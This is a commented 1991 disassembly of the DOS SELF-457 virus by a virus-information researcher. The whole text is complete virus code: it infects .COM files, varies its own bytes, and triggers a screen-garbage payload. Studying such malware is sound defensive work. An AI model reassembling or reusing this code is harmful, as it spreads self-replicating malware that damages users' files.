

;===============================================
; Virus SELF-457
;
; disassembled by: Andrzej Kadlof may 1991
;
; (C) Polish Section of Virus Information BAnk
;===============================================

0100 EB3D           JMP     013F

0102  4D 53                     ; virus signature MS
0104  00                        ; not used
0105  2A 2E 43 4F 4D 00         ; *.COM, 0

; working bytes

010B  00 00 00 00 
010F  00 00                     ; new file length
0111  04 00                     ; divider

; local DTA

0113  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ; reserved
0128  00 00 00 00 00 00 00 00
0130  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

; dummy part of code changed in each virus copy

013F 52             PUSH    DX
0140 5A             POP     DX
0141 52             PUSH    DX
0142 5A             POP     DX
0143 52             PUSH    DX
0144 5A             POP     DX
0145 52             PUSH    DX
0146 5A             POP     DX

; stable code started here
; copy virus code above 64 Kb block for with victim

0147 50             PUSH    AX          ; store AX
0148 8CCA           MOV     DX,CS
014A 8BC2           MOV     AX,DX
014C 050010         ADD     AX,1000     ; 4 Kb
014F 8BD0           MOV     DX,AX
0151 8EC2           MOV     ES,DX       ; bufer above 64 Kb block
0153 BE0001         MOV     SI,0100     ; source
0156 33FF           XOR     DI,DI       ; destination
0158 B9C901         MOV     CX,01C9     ; virus length (457)
015B 90             NOP
015C F3A4           REPZ    MOVSB       ; move virus code        

; set local DTA

015E BA1301         MOV     DX,0113     ; local DTA
0161 B41A           MOV     AH,1A       ; set DTA
0163 CD21           INT     21

; find first COM file in current directory

0165 BA0501         MOV     DX,0105
0168 B90600         MOV     CX,0006     ; System + Hiden
016B B44E           MOV     AH,4E       ; find first
016D CD21           INT     21
016F 7303           JAE     0174

0171 E9B900         JMP     022D        ; check system time and date

0174 BA3101         MOV     DX,0131     ; file name
0177 B8023D         MOV     AX,3D02     ; open file for read/write
017A CD21           INT     21

; read file just above virus code

017C 8BD8           MOV     BX,AX       ; handle
017E 06             PUSH    ES
017F 1F             POP     DS
0180 BAC901         MOV     DX,01C9     ; buffer
0183 90             NOP
0184 B9FFFF         MOV     CX,FFFF     ; full file (??)
0187 B43F           MOV     AH,3F       ; read file
0189 CD21           INT     21

018B 05C901         ADD     AX,01C9     ; new file length
018E 90             NOP
018F 2EA30F01       MOV     CS:[010F],AX
0193 813ECB014D53   CMP     WORD PTR [01CB],534D  ; 'MS' virus signature
0199 7503           JNZ     019E

019B E98000         JMP     021E        ; file already infected

019E 33C9           XOR     CX,CX
01A0 8BD1           MOV     DX,CX
01A2 B80042         MOV     AX,4200     ; move file ptr to BOF
01A5 CD21           INT     21

; modify some of 8 bytes at 13F

01A7 B42C           MOV     AH,2C       ; get time
01A9 CD21           INT     21

01AB 8AC2           MOV     AL,DL       ; hundredths of a second
01AD 98             CBW                 ; clear AH
01AE 40             INC     AX
01AF 99             CWD                 ; clear DX
01B0 2E8B0E1101     MOV     CX,CS:[0111]  ; 0004
01B5 F7F9           IDIV    CX          ; remainder in DX will be 0, 1, 2 or 3
01B7 42             INC     DX          ; DX should be >= 1
01B8 D1C2           ROL     DX,1        ; and DX should be add
01BA 8BFA           MOV     DI,DX       ; new offset id ready
01BC C7853D001E1F   MOV     WORD PTR [DI+003D],1F1E  ; PUSH DS,  POP DS

01C2 B42C           MOV     AH,2C       ; get time
01C4 CD21           INT     21

01C6 8AC2           MOV     AL,DL
01C8 98             CBW
01C9 40             INC     AX
01CA 99             CWD
01CB 2E8B0E1101     MOV     CX,CS:[0111]
01D0 F7F9           IDIV    CX
01D2 42             INC     DX
01D3 D1C2           ROL     DX,1
01D5 8BFA           MOV     DI,DX
01D7 C7853D000607   MOV     WORD PTR [DI+003D],0706  ; PUSH ES, POP ES
01DD B42C           MOV     AH,2C       ; get time
01DF CD21           INT     21

01E1 8AC2           MOV     AL,DL
01E3 98             CBW
01E4 40             INC     AX
01E5 99             CWD
01E6 2E8B0E1101     MOV     CX,CS:[0111]
01EB F7F9           IDIV    CX
01ED 42             INC     DX
01EE D1C2           ROL     DX,1
01F0 8BFA           MOV     DI,DX
01F2 C7853D005159   MOV     WORD PTR [DI+003D],5951  ; PUSH CX, POP CX
01F8 B42C           MOV     AH,2C       ; get time
01FA CD21           INT     21

01FC 8AC2           MOV     AL,DL
01FE 98             CBW
01FF 40             INC     AX
0200 99             CWD
0201 2E8B0E1101     MOV     CX,CS:[0111]
0206 F7F9           IDIV    CX
0208 42             INC     DX
0209 D1C2           ROL     DX,1
020B 8BFA           MOV     DI,DX
020D C7853D00525A   MOV     WORD PTR [DI+003D],5A52  ; code of PUSH DX, POP DX

; write virus code to file

0213 33D2           XOR     DX,DX       ; virus code
0215 2E8B0E0F01     MOV     CX,CS:[010F]   ; new file length
021A B440           MOV     AH,40       ; write file
021C CD21           INT     21

021E B43E           MOV     AH,3E       ; close file
0220 CD21           INT     21

; find next victim

0222 0E             PUSH    CS
0223 1F             POP     DS
0224 B44F           MOV     AH,4F       ; find next
0226 CD21           INT     21

0228 7203           JB      022D        ; no more files, exit

022A E947FF         JMP     0174        ; infect next file

; restore DTA

022D BA8000         MOV     DX,0080     ; standard DTA
0230 B41A           MOV     AH,1A       ; set DTA
0232 CD21           INT     21

; check time for video efect

0234 B42C           MOV     AH,2C       ; get time
0236 CD21           INT     21

0238 80FD05         CMP     CH,05       ; hour
023B 7403           JZ      0240

023D EB4C           JMP     028B        ; restore application and run it
023F 90             NOP

0240 B42A           MOV     AH,2A       ; get date
0242 CD21           INT     21

0244 3C00           CMP     AL,00       ; sunday?
0246 7403           JZ      024B

0248 EB41           JMP     028B        ; restore application and run it
024A 90             NOP

; video efect

024B B40F           MOV     AH,0F       ; get video mode
024D CD10           INT     10

024F 50             PUSH    AX          ; store video mode
0250 32E4           XOR     AH,AH
0252 B005           MOV     AL,05       ; set graphic 320x200 (CGA, EGA, B800)
0254 CD10           INT     10

0256 B95100         MOV     CX,0051     ; number of screen operations
0259 B87F01         MOV     AX,017F
025C 2D0F04         SUB     AX,040F     ; FD70, segment of garbage in ROM
025F 8BF0           MOV     SI,AX

0261 51             PUSH    CX          ; store counter
0262 56             PUSH    SI          ; segment of source garbage
0263 1F             POP     DS
0264 1E             PUSH    DS          ; store segment
0265 33F6           XOR     SI,SI       ; start of buffer
0267 B800B8         MOV     AX,B800     ; segment of video buffer
026A 8EC0           MOV     ES,AX
026C 33FF           XOR     DI,DI       ; begin of screen
026E B90040         MOV     CX,4000     ; full screen
0271 F3A4           REPZ    MOVSB       ; write
0273 58             POP     AX          ; addjust segment of source garbage
0274 054000         ADD     AX,0040
0277 8BF0           MOV     SI,AX       ; store new segment in SI
0279 59             POP     CX          ; restore counter
027A 83E901         SUB     CX,+01
027D 83F900         CMP     CX,+00
0280 75DF           JNZ     0261        ; write next screen

0282 58             POP     AX          ; old video mode
0283 B400           MOV     AH,00       ; set video mode
0285 B003           MOV     AL,03       ; text 80x25
0287 CD10           INT     10

0289 CD20           INT     20          ; terminate

; restore application and run it
; first copy own 22h bytes above victim code

028B BEA702         MOV     SI,02A7
028E B92200         MOV     CX,0022
0291 33FF           XOR     DI,DI
0293 F3A4           REPZ    MOVSB
0295 5B             POP     BX
0296 2EC7060B010000 MOV     WORD PTR CS:[010B],0000
029D 2E8C060D01     MOV     CS:[010D],ES
02A2 2EFF2E0B01     JMP     DWORD PTR CS:[010B]

; after above jump virus vill continue there

02A7 1E             PUSH    DS
02A8 07             POP     ES
02A9 BEC902         MOV     SI,02C9     ; pointer to first byte of victim code
02AC BF0001         MOV     DI,0100     ; destination
02AF B9FFFF         MOV     CX,FFFF     ; 64 Kb
02B2 2BCE           SUB     CX,SI       ; virus length
02B4 F3A4           REPZ    MOVSB       ; move
02B6 2EC70600010001 MOV     WORD PTR CS:[0100],0100  ; application entry point
02BD 2E8C1E0201     MOV     CS:[0102],DS
02C2 8BC3           MOV     AX,BX
02C4 2EFF2E0001     JMP     DWORD PTR CS:[0100] ; jump to application


